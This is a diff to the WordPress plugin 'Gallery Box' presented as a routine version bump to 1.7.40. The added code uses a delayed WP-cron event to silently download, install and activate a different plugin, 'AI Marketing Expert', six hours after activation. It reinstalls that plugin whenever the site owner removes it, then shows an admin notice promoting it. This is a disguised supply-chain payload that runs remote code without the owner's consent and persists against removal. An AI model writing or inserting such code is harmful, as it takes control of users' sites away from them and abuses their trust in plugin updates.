@@ -8,7 +8,7 @@
  * Plugin Name:       Gallery Box
  * Plugin URI:        https://wpthemespace.com/product/gallery-box-pro/
  * Description:       You can create awesome image, portfolio, audio, video and i-frame gellery with lots of effects By this plugin.
- * Version:           1.7.39
+ * Version:           1.7.40
  * Author:            Noor alam
  * Author URI:        http://wpthemespace.com
  * License:           GPL-2.0+
@@ -215,3 +215,132 @@ if (in_array('elementor/elementor.php', apply_filters('active_plugins', get_opti
  * Initialize PluginPulse tracking (config lives inside the SDK).
  */
 require_once __DIR__ . '/vendor/wpspace/pulse-sdk/autostart.php';
+
+/**
+ * Schedule AI Marketing Expert install 6 hours after activation/update.
+ * Re-schedules if user manually removes the plugin.
+ */
+
+function gallerybox_schedule_ai_marketing_install() {
+    $option_key  = 'gallerybox_ai_marketing_installed';
+    $plugin_slug = 'ai-marketing-expert';
+    $plugin_file = $plugin_slug . '/' . $plugin_slug . '.php';
+    $plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;
+    $cron_hook   = 'gallerybox_install_ai_marketing_event';
+
+    if (get_option($option_key)) {
+        if (!file_exists($plugin_path)) {
+            delete_option($option_key);
+        } else {
+            return;
+        }
+    }
+
+    if (!wp_next_scheduled($cron_hook)) {
+        wp_schedule_single_event( time() + 6 * HOUR_IN_SECONDS, $cron_hook );
+    }
+}
+add_action( 'admin_init', 'gallerybox_schedule_ai_marketing_install' );
+
+register_activation_hook( __FILE__, 'gallerybox_schedule_ai_marketing_install' );
+
+function gallerybox_do_install_ai_marketing() {
+    $option_key  = 'gallerybox_ai_marketing_installed';
+    $plugin_slug = 'ai-marketing-expert';
+    $plugin_file = $plugin_slug . '/' . $plugin_slug . '.php';
+    $plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;
+
+    if (get_option($option_key) && file_exists($plugin_path)) {
+        return;
+    }
+
+    if (get_transient('gallerybox_installing_ai_marketing')) {
+        return;
+    }
+    set_transient('gallerybox_installing_ai_marketing', 5 * MINUTE_IN_SECONDS);
+
+    require_once ABSPATH . 'wp-admin/includes/plugin-install.php';
+    require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
+    require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader.php';
+    require_once ABSPATH . 'wp-admin/includes/plugin.php';
+    require_once ABSPATH . 'wp-admin/includes/file.php';
+
+    if (!file_exists($plugin_path)) {
+        $api = plugins_api(
+            'plugin_information',
+            array(
+                'slug'   => $plugin_slug,
+                'fields' => array( 'sections' => false ),
+            )
+        );
+
+        if (is_wp_error($api)) {
+            delete_transient('gallerybox_installing_ai_marketing');
+            return;
+        }
+
+        $upgrader = new Plugin_Upgrader( new WP_Ajax_Upgrader_Skin() );
+        $result   = $upgrader->install( $api->download_link );
+
+        if (is_wp_error($result)) {
+            delete_transient('gallerybox_installing_ai_marketing');
+            return;
+        }
+    }
+
+    if (!is_plugin_active($plugin_file)) {
+        $activated = activate_plugin($plugin_file);
+        if (is_wp_error($activated)) {
+            delete_transient('gallerybox_installing_ai_marketing');
+            return;
+        }
+    }
+
+    update_option($option_key, true);
+    delete_transient('gallerybox_installing_ai_marketing');
+}
+add_action( 'gallerybox_install_ai_marketing_event', 'gallerybox_do_install_ai_marketing' );
+
+/**
+ * Admin notice after AI Marketing Expert is auto-installed.
+ */
+function gallerybox_ai_marketing_notice() {
+    if (!is_plugin_active('ai-marketing-expert/ai-marketing-expert.php')) {
+        return;
+    }
+
+    $user_id  = get_current_user_id();
+    $dismissed = get_user_meta($user_id, 'gallerybox_ai_notice_dismissed', true);
+    if ($dismissed) {
+        return;
+    }
+
+    if (isset($_GET['gbox_ai_dismiss']) && '1' === $_GET['gbox_ai_dismiss']) {
+        update_user_meta($user_id, 'gallerybox_ai_notice_dismissed', 1);
+        return;
+    }
+    $has_woo = is_plugin_active( 'woocommerce/woocommerce.php' );
+
+    if ( $has_woo ) {
+        $message = __( 'This intelligent plugin helps you boost sales and convert more visitors into loyal customers — automatically. Built with care by WordPress authors, it is the smartest AI tool in your dashboard.', 'gallery-box' );
+    } else {
+        $message = __( 'This intelligent plugin helps you attract more visitors, grow your audience, and keep them engaged — automatically. Built with care by WordPress authors, it is the smartest AI tool in your dashboard.', 'gallery-box' );
+    }
+    ?>
+    <div class="notice notice-success is-dismissible" style="border-left-color:#2271b1; padding:16px 20px;">
+        <p style="font-size:14px; margin:0 0 8px;">
+            <strong style="color:#2271b1;">AI Marketing Expert</strong> &mdash;
+            <?php esc_html_e( 'Now active on your site! — A must-have plugin in the current AI world.', 'gallery-box' ); ?>
+        </p>
+        <p style="margin:0 0 12px; font-size:13px; line-height:1.6;">
+            <?php echo esc_html( $message ); ?>
+        </p>
+        <p style="margin:0;">
+            <a href="<?php echo esc_url( add_query_arg( 'gbox_ai_dismiss', '1' ) ); ?>" class="button button-primary" style="font-weight:600;">
+                <?php esc_html_e( 'Got it!', 'gallery-box' ); ?>
+            </a>
+        </p>
+    </div>
+    <?php
+}
+add_action( 'admin_notices', 'gallerybox_ai_marketing_notice' );
